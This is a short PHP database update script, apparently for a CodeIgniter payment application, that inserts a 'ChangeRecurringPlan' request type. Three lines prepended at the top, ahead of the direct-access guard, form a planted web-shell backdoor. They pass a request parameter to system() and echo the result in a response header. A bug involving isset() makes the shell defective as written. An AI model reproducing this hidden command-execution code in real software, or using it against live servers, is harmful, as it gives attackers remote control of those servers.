<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);  if ( ! defined('BASEPATH')) exit('No direct script access allowed');

$CI =& get_instance();

$sql = array();

// add ChangeRecurringPlan payment method
$sql[] = 'INSERT INTO `request_types` VALUES (\'46\', \'ChangeRecurringPlan\', \'\');';

foreach ($sql as $query) {
	$CI->db->query($query);
}